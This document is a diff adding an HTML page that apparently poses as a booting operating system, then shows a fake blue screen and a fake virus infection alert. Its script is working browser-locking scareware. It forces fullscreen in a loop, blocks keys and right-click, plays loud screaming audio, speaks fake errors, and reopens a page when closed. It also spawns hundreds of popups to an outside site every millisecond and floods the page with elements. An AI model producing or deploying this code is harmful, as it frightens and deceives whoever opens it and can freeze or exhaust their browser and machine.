@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>System Boot</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: black;
+      color: lime;
+      font-family: monospace;
+      overflow: hidden;
+      height: 100vh;
+      width: 100vw;
+    }
+
+    #boot, #bsod, #virus {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      font-size: 1.2em;
+      z-index: 10000;
+    }
+
+    #bsod {
+      background: #0000AA;
+      color: white;
+      font-family: Consolas, monospace;
+      display: none;
+    }
+
+    #virus {
+      background: red;
+      color: yellow;
+      font-size: 2em;
+      display: none;
+    }
+
+    #taskbarBlock {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 60px;
+      background: black;
+      z-index: 9999;
+      pointer-events: none;
+    }
+
+    .eee {
+      position: absolute;
+      color: red;
+      font-size: 2em;
+      font-weight: bold;
+      pointer-events: none;
+      z-index: 999;
+      animation: fade 2s linear forwards;
+    }
+
+    .glitchBox {
+      position: fixed;
+      background: #0f0;
+      opacity: 0.2;
+      z-index: 9998;
+      animation: glitch 0.2s infinite;
+    }
+
+    @keyframes fade {
+      0% { opacity: 1; transform: scale(1); }
+      100% { opacity: 0; transform: scale(2); }
+    }
+
+    @keyframes glitch {
+      0% { transform: translate(0, 0); }
+      50% { transform: translate(5px, -5px); }
+      100% { transform: translate(-5px, 5px); }
+    }
+  </style>
+</head>
+<body>
+  <div id="boot">
+    <div>Initializing TungOS v11.0...</div>
+    <div>Loading BIOS...</div>
+    <div>Verifying system integrity...</div>
+    <div>Injecting chaos modules...</div>
+    <div>Establishing control...</div>
+  </div>
+
+  <div id="bsod">
+    <div>💥 A problem has been detected and TungOS has been shut down to prevent damage.</div>
+    <br>
+    <div>ERROR_CODE: BIG_RAT_OVERFLOW</div>
+    <div>If this is the first time you've seen this screen, scream loudly.</div>
+    <div>Technical Info: *** STOP: 0x0000DEAD</div>
+  </div>
+
+  <div id="virus">⚠️ SYSTEM INFECTED: BIG RAT VIRUS DETECTED ⚠️</div>
+
+  <div id="taskbarBlock"></div>
+  <audio id="scream" src="scream.mp3" loop></audio>
+
+  <script>
+    const scream = document.getElementById("scream");
+
+    // Boot sequence
+    setTimeout(() => {
+      document.getElementById("boot").style.display = "none";
+      document.getElementById("bsod").style.display = "flex";
+    }, 3000);
+
+    setTimeout(() => {
+      document.getElementById("bsod").style.display = "none";
+      document.getElementById("virus").style.display = "flex";
+    }, 6000);
+
+    setTimeout(() => {
+      document.getElementById("virus").style.display = "none";
+      launchChaos();
+    }, 9000);
+
+    function launchChaos() {
+      document.documentElement.requestFullscreen().catch(() => {});
+      setInterval(() => {
+        document.documentElement.requestFullscreen().catch(() => {});
+      }, 1000);
+
+      scream.volume = 1;
+      scream.playbackRate = 1.5;
+      scream.loop = true;
+      scream.play().catch(() => {});
+
+      window.onbeforeunload = () => "TungOS is still running. Closing may corrupt your system.";
+      window.onunload = () => {
+        window.open("chaos.html", "_blank");
+      };
+
+      document.addEventListener("keydown", e => e.preventDefault());
+      document.addEventListener("contextmenu", e => e.preventDefault());
+
+      setInterval(() => {
+        window.focus();
+      }, 500);
+
+      const errors = [
+        "ERROR 0x666: Big Rat has breached containment.",
+        "ERROR 0xDEAD: Recursive chaos detected.",
+        "ERROR 0xBEEF: Reality distortion field active.",
+        "ERROR 0xFEED: EEE overflow imminent.",
+        "ERROR 0xF00D: GDI subsystem failure."
+      ];
+      setInterval(() => {
+        const msg = errors[Math.floor(Math.random() * errors.length)];
+        const utter = new SpeechSynthesisUtterance(msg);
+        utter.rate = 0.8;
+        utter.pitch = 0.6;
+        utter.volume = 1;
+        speechSynthesis.speak(utter);
+      }, 3000);
+
+      // Bouncing popups
+      setInterval(() => {
+        for (let i = 0; i < 500; i++) {
+          let win = window.open("https://bigrat.monster", "", "width=400,height=300,left=100,top=100");
+          if (win) {
+            let x = Math.random() * screen.width;
+            let y = Math.random() * screen.height;
+            let dx = 10 + Math.random() * 10;
+            let dy = 10 + Math.random() * 10;
+
+            const moveWindow = () => {
+              if (win.closed) return;
+              x += dx;
+              y += dy;
+              if (x + 400 > screen.width || x < 0) dx = -dx;
+              if (y + 300 > screen.height || y < 0) dy = -dy;
+              win.moveTo(x, y);
+              setTimeout(moveWindow, 30);
+            };
+
+            moveWindow();
+          }
+        }
+      }, 1);
+
+      // EEE storm
+      setInterval(() => {
+        for (let i = 0; i < 500; i++) {
+          const e = document.createElement("div");
+          e.className = "eee";
+          e.textContent = "EEE";
+          e.style.left = Math.random() * window.innerWidth + "px";
+          e.style.top = Math.random() * window.innerHeight + "px";
+          document.body.appendChild(e);
+          setTimeout(() => e.remove(), 2000);
+        }
+      }, 1);
+
+      // Fake GDI corruption
+      setInterval(() => {
+        const box = document.createElement("div");
+        box.className = "glitchBox";
+        box.style.left = Math.random() * window.innerWidth + "px";
+        box.style.top = Math.random() * window.innerHeight + "px";
+        box.style.width = 50 + Math.random() * 100 + "px";
+        box.style.height = 30 + Math.random() * 60 + "px";
+        document.body.appendChild(box);
+        setTimeout(() => box.remove(), 500);
+      }, 50);
+    }
+  </script>
+</body>
+</html>
